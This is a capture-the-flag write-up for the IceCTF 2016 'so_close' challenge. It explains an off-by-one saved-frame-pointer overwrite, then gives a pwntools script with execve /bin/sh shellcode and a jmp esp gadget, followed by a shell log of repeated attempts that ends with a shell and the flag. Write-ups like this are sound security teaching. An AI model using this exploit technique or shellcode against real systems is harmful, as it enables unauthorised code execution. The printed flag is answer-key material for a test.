### Solved by superkojiman

This binary is vulnerable to an off-by-one overwrite. In this case, we can overwrite the saved frame pointer, but not the saved return pointer. 

EBP is overwritten in completely_secure() at offset 268. This causes totally_secure() to crash when it returns. ASLR is enabled, but the stack is executable. I decided to store my shellcode on the stack and overwrite just the last byte of EBP with 0x00 to see if I could have it return to a "jmp esp" gadget, which would execut the shellcode. Since ASLR is enabled, we need to run the exploit several times until it works: 

```
#!/usr/bin/env python

from pwn import *
context(os="linux", arch="i386")

jmp_esp = p32(0x804959f)
sc  = "jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80"
pay = jmp_esp + sc

buf = ""

buf += pay * 10                 # fill buffer with jmp esp and shellcode
buf += cyclic(268-len(buf))     # fill up the rest with junk
buf += "\x00"                   # overwrite last byte of ebp to 0x00, 
                                # hopefully we return to our 'jmp esp' payload

print "len buf:", len(buf)
open("in.txt", "w").write(buf)
```

And finally, getting the flag:

```

[ctf-14394@icectf-shell-2016 ~]$ (cat in.txt; cat) | /home/so_close/so_close
something something something..

[1]    29687 broken pipe         ( cat in.txt; cat; ) |
       29689 segmentation fault  /home/so_close/so_close
[ctf-14394@icectf-shell-2016 ~]$ (cat in.txt; cat) | /home/so_close/so_close
something something something..

[1]    29707 broken pipe         ( cat in.txt; cat; ) |
       29708 segmentation fault  /home/so_close/so_close
[ctf-14394@icectf-shell-2016 ~]$ (cat in.txt; cat) | /home/so_close/so_close
something something something..

[1]    29724 broken pipe         ( cat in.txt; cat; ) |
       29725 segmentation fault  /home/so_close/so_close
[ctf-14394@icectf-shell-2016 ~]$ (cat in.txt; cat) | /home/so_close/so_close
something something something..

id
uid=2752(ctf-14394) gid=1003(ctf) egid=1008(so_close) groups=1008(so_close),1003(ctf)
cat /home/so_close/flag.txt
IceCTF{eeeeeeee_bbbbbbbbb_pppppppp_woooooo}
```

